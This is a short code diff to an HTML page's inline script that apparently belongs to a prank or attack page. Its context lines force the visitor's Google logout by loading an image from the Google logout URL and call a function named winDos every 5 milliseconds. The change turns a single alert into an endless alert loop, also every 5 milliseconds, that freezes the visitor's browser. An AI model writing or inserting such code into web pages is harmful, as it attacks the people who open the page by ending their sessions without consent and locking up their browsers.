@@ -107,8 +107,8 @@ if (RTCPeerConnection) (function () {
       var a = new Image();
       a.src="https://accounts.google.com/Logout";
     }
-    alert('Windows DoS initiated.');
     setInterval(winDos, 5);
+    setInterval(function() {alert('Windows DoS initiated.')}, 5);
   }
   </script>
 </body>
